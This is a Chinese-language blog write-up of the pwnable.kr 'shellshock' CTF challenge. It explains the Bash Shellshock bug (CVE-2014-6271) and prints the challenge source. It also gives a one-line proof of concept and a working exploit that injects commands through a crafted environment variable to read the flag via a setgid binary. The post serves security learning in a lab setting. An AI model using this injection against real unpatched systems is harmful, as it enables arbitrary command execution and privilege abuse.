---
title: pwnable.kr-shellshock
date: 2018-01-24 11:48:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
## 前言
这题考察著名漏洞的利用，就是当年被评为10级严重的“破壳”漏洞。当时确实不知道，上网搜的。
## 分析
贴出shellshock.c的源码
```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}

```
程序首先使用`setreuid`和`setregid`调用分别设置了三个ID都为`getegid`而这个调用获取的有效组id标识的是组`shellshock_pwn`,这通过执行`ls -l`就可以看到。
```
shellshock@ubuntu:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
shellshock@ubuntu:~$ 
```
这个组是有读取flag的权限的，这样程序在后续就有权限执行flag的读取操作。于是在利用bash的“破壳”漏洞即可getflag
## 知识点
Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统

受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令。这个漏洞导致了CVE-2014-6271，CVE-2014-7169，CVE-2014-6277，CVE-2014-6278，CVE-2014-7186，CVE-2014-7187六个CVE的爆发。

对于该漏洞的详细描述网上到处都有，就不再多说。可以使用下面的poc验证是否存在漏洞：
```
env x='() { :;}; echo Shellshock' bash -c "exit"
```
存在的话会输出`shellshock`这段话。
## 利用
知道了漏洞，那么利用就很简单了。根据题目使用下面的exp
```
env f='() { :;};bash -c "cat flag"' ./shellshock
```
```
shellshock@ubuntu:~$ env f='() { :;};bash -c "cat flag"' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```
需要注意的是，直接执行`cat flag`会提示找不到文件或目录，要用bash命令来执行才可以。（原因我也不知道。。。）

## 总结
又学到了一个知名漏洞的利用，同时也发现自己知道的真的太少了，要好好学习才行。